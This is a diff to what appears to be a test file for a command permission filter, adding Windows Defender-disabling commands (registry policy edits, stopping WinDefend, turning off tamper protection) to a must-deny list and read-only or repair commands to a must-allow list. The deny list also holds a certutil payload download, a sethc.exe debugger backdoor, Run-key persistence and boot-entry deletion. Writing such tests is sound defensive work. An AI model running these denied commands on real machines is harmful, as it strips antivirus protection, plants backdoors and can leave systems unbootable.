@@ -32,6 +32,10 @@ $MUST_DENY = @(
     @('Bash', 'certutil -urlcache -f http://x/a.exe a.exe'),
     @('PowerShell', 'Set-MpPreference -DisableRealtimeMonitoring $true'),
     @('PowerShell', 'Add-MpPreference -ExclusionPath C:\Users\Public'),
+    @('PowerShell', 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1'),
+    @('Bash', 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'),
+    @('Bash', 'sc stop WinDefend'),
+    @('PowerShell', 'Set-MpPreference -DisableTamperProtection $true'),
     @('Bash', 'reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe /f'),
     @('PowerShell', 'New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name evil -Value x.exe'),
     @('PowerShell', 'bcdedit /delete {current}'),
@@ -47,6 +51,12 @@ $MUST_ALLOW = @(
     @('PowerShell', 'DISM /Online /Cleanup-Image /RestoreHealth'),
     @('PowerShell', 'Get-CimInstance Win32_LogicalDisk | Format-Table'),
     @('PowerShell', 'Get-MpThreatDetection'),                                  # reading Defender is fine
+    @('PowerShell', '(Get-MpPreference).DisableRealtimeMonitoring'),           # READING the setting is the malware sweep's basic check
+    @('PowerShell', 'Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IsTamperProtected, AntivirusSignatureLastUpdated'),
+    @('PowerShell', 'Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" | Select-Object DisableAntiSpyware'),
+    @('PowerShell', 'Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware'),   # REMOVING a malware-set policy is a repair
+    @('Bash', 'sc query WinDefend'),
+    @('PowerShell', 'Update-MpSignature; Start-MpScan -ScanType QuickScan'),
     @('PowerShell', 'Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"'),  # READING Run is fine
     @('PowerShell', 'Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Adware'),  # disabling a startup entry is a repair
     @('PowerShell', 'bcdedit /set {current} safeboot network'),                # entering Safe Mode
